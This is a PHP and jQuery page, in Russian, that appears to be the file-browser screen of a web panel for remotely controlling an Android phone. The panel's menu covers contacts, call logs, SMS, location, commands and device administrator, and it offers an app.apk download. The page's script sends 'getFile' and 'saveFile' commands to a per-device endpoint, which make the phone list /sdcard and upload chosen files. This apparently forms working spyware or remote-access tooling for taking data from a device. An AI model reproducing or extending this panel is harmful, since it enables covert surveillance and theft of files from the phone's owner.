<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<?php
    require "db.php";
    if($_SESSION['logged_used']==null || $_SESSION['device_select']==null){
      header('Location: /index');
      exit;
    }
?>

<head>
  <meta charset="UTF-8">
  <title>Проводник</title>
  <meta http-equiv="X-UA-Compatible" content=="IE=edge"/>
  <meta name="google" value="notranslate"/>
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
  <link rel="stylesheet" href="./style/menu.css">
  <link rel="stylesheet" href="./style/button.css">
  <link rel="stylesheet" href="./style/barsearch.css">
  <link rel="stylesheet" href="./style/osn.css">


  <script src="./libs/jquery-3.1.1.min.js"></script>
  <script src="./scripts/menu.js"></script>

  <meta http-equiv="X-UA-Compatible" content=="IE=edge"/>
  <meta name="google" value="notranslate"/>
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

</head>
<body>
  <section class="menu">
    <nav class="main-menu">
      <p></p>
      <div class="scrollbar" id="style-1">
        <ul>
          <li>                                   
            <a href="home">
              <i class="fa2 theme--light material-icons">home</i>
              <span class="nav-text">Главная</span>
            </a>
          </li>
          <li>                                   
            <a href="Contacts">
              <i class="fa2 theme--light material-icons">contacts</i>
              <span class="nav-text">Контакты</span>
            </a>
          </li>
          <li>                                 
            <a href="Call">
              <i class="fa2 theme--light material-icons">call</i>
              <span class="nav-text">Журнал вызовов</span>
            </a>
          </li>   
          <li>
            <a href="Block">
              <i class="fa2 theme--light material-icons">block</i>
              <span class="nav-text">Блок вызовов</span>
            </a>
          </li>
          <li>
            <a href="Sms">
              <i class="fa2 theme--light material-icons">message</i>
              <span class="nav-text">Сообщения</span>
            </a>
          </li>
          <li>
            <a href="FileManager">
              <i class="fa2 theme--light material-icons">storage</i>
              <span class="nav-text">Проводник</span>
            </a>
          </li>
          <li>
            <a href="Location">
              <i class="fa2 theme--light material-icons">my_location</i>
              <span class="nav-text">Расположение</span>
            </a>
          </li>
          <li>
            <a href="#">
              <i class="fa2 theme--light material-icons">perm_media</i>
              <span class="nav-text">Загрузки</span>
            </a>
          </li>
          <li>
            <a href="#">
              <i class="fa2 theme--light material-icons">view_list</i>
              <span class="nav-text">Команды</span>
            </a>
          </li>
          <li>
            <a href="#">
              <i class="fa2 theme--light material-icons">list_alt</i>
              <span class="nav-text">Журнал приложений</span>
            </a>
          </li>
          <li>
            <a href="#">
              <i class="fa2 theme--light material-icons">details</i>
              <span class="nav-text">Информация об устройстве</span>
            </a>
          </li>
          <li>
            <a href="#">
              <i class="fa2 theme--light material-icons">security</i>
              <span class="nav-text">Администратор устройства</span>
            </a>
          </li>
        </ul>
      </div>
    </nav>
    <header>
      <div class="head">
      <div class="main-info">
        Выбрано устройство: <?php echo $_SESSION['headerDev']; ?>
      </div>
      <div class="spacer"></div>

      <a href="app.apk" download="">
        <button type="button" class="btn" id="download">
          <span class="spn">
            <i class="theme--light material-icons md-36" >get_app</i>
          </span>
        </button>
      </a>
      <div class="usm" onclick="usermenu()">
        <nav title="User Menu" >
          <button type="button" class="btn">
            <span class="spn">
              <i class="theme--light material-icons md-36" >account_circle</i>
            </span>
          </button>
          <ul id="usermenu" class="UserMenu" data-open="false" >
            <li title="Индификатор">
              <span style="margin-left: 12px;" class="UserMenu_text">Индификатор: <?=$_SESSION['sid'] ?></span>
            </li>
            <li title="Профиль" class="UserMenu_brdt">
              <a href="Account">
                    <i class="fa2 theme--light material-icons wh"  >person</i>
                    <span class="UserMenu_text">Профиль</span>
                </a>
            </li>
            <li class="UserMenu_brdt" title="Выйти">
              <a href="logout">
                  <i class="fa2 theme--light material-icons wh">exit_to_app</i>
                  <span class="UserMenu_text">Выйти</span>
                </a>
            </li>
          </ul>
        </nav>
      </div>

      </div>
    </header>
  </section>
          
  <div class="v-content fix">
    <div class="v-content_wrap">
      <div class="container container--fluid">
        <div class="w3-container">
          <div class="w3-card-4">
            <header class="w3-container w3-blue w3-header"> <h1>Управление</h1> </header>

            <div class="status">
              <pre>Онлайн:<div id="lastonline"></div></pre>
              <pre>Лог:<div id="output"></div></pre> 
              <div id="log"></div>
            </div>

            <p></p>
            <input type = "button" id = "loaded" class="btn-load" value = "Загрузить" onclick="getFile(1);" style="margin-left:10px;"/>
            <pre></pre>
            <input type = "button" class="btn-del" value = "Отчистить" onclick="ochistka()" style="margin-left:10px;margin-bottom:10px;"/>
            
          </div>
        </div>
        <div id="list"></div>
        <div class="parent" style="margin-top: 40px;">
          <p></p>
          <div class="w3-container">
            <div class="w3-card-4 card">
              <p></p>
              <body>
                <table id="excelDataTable" style="z-index: 0;" border="1">
                </table>
              </body>
            </div>
          </div>
        </div>

      </div>
    </div>
  </div>
  
</body>

<script type="text/javascript">
  var myList;
  
  getOnline();

  getOutput(); 

  getTab();

  function buildHtmlTable(selector) {
  	ochistka();
    var columns = addAllColumnHeaders(myList, selector);

    for (var i = 0; i < myList.length; i++) {
	    var row$ = $('<tr/>');
	    if(myList[i]["isDir"] === true)
	    	row$.append($('<td/>').html("<i class=\"fa2 theme--light material-icons\">folder</i> "));
	    else
	    	row$.append($('<td/>').html("<i class=\"fa2 theme--light material-icons\">save</i> "));
	    for (var colIndex = 0; colIndex < columns.length; colIndex++) {
	      var cellValue = myList[i][columns[colIndex]];
	      if (cellValue == null) cellValue = "";
	      	row$.append($('<td/>').html(cellValue));
	      }
	      var pa=myList[i]["path"];
	      if(myList[i]['isDir'] === false)
	      	row$.append($('<td/>').html("<input type=button value=\"Сохранить\" style=\"width:100%;heigth:100%;padding:5;float:left;\" class=\"btn-chn\" onclick=\"save('"+i+"')\">"));
	      else
	      	row$.append($('<td/>').html("<input type=button value=\"Открыть\" style=\"width:100%;heigth:100%;padding:2;float:left;\" class=\"btn-load\" onclick=\"getFile('"+pa+"')\">"));

      $(selector).append(row$);
    }
  }

  function addAllColumnHeaders(myList, selector) {
    var columnSet = [];
    var headerTr$ = $('<tr/>');

    headerTr$.append($('<th/>').html(""));
    for (var i = 0; i < myList.length; i++) {
      var rowHash = myList[i];
      for (var key in rowHash) {
        if(key == "isDir" || key=="path")
          break;
        if ($.inArray(key, columnSet) == -1) {
          columnSet.push(key);

          headerTr$.append($('<th/>').html(key));
        }
      }
    }
    headerTr$.append($('<th/>').html("Controls"));
    $(selector).append(headerTr$);

    return columnSet;
  }

  
  function ochistka(){
     $("tr").remove();
  }

  function getFile(pathV){
  	if(pathV=="1")
  		pathV="/sdcard";
    let fm = {
          path:pathV,

          toString() {
            return `{path: "${this.path}"}`;
          }
    };


    $.post( 
      "/Devices/<?=$_SESSION['device_select']->device_id ?>/cmd.php",
      { cmd: "",spec:"getFile "+fm},
      function(data) {
        $('#stage').html(data);
        
      }
    );

    //window.location.reload(true);
  }

  function save(num){
    var p = myList[num]['path'];
    let fm = {
          path:p,

          toString() {
            return `{path: "${this.path}"}`;
          }
    };
    $.post( 
      "/Devices/<?=$_SESSION['device_select']->device_id ?>/cmd.php",
      { cmd: "",spec:"saveFile "+fm},
      function(data) {
        $('#stage').html(data);
        
      }
    );
  }

	function getOnline() {
	   
	    $('#lastonline').load('/Devices/<?=$_SESSION['device_select']->device_id ?>/getlastonline.php');
	    setTimeout("getOnline()",2000);
	}
	function getOutput() {
    
	    $('#log').load('/Devices/<?=$_SESSION['device_select']->device_id ?>/show_output.php').hide(true);
	    var stri = $('#log').text();
	    if(stri.includes("FM"))
	    	$('#output').html($('#log').text());
	    setTimeout("getOutput()",2000);
	}
	function getTab(){
	    var JsonList=$.getJSON("/Devices/<?=$_SESSION['device_select']->device_id ?>/info/FileManager/fm.json",function(data){
	    	myList = data;
	    	buildHtmlTable('#excelDataTable');
	    	var element = document.querySelector('#excelDataTable');
			element.getElementsByTagName("th")[0].style.width='50px';
			element.getElementsByTagName("th")[2].style.width='100px';
	    });
	    
	    setTimeout("getTab()",20000);
	    
	}
  
  
</script>

</html>